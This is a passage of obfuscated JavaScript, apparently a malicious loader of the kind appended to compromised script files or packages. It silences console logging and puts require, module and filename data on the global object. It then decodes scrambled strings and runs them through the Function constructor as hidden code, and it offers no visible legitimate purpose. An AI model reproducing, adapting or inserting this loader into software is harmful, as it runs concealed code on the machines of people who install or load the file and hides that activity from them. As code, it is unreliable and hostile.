a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
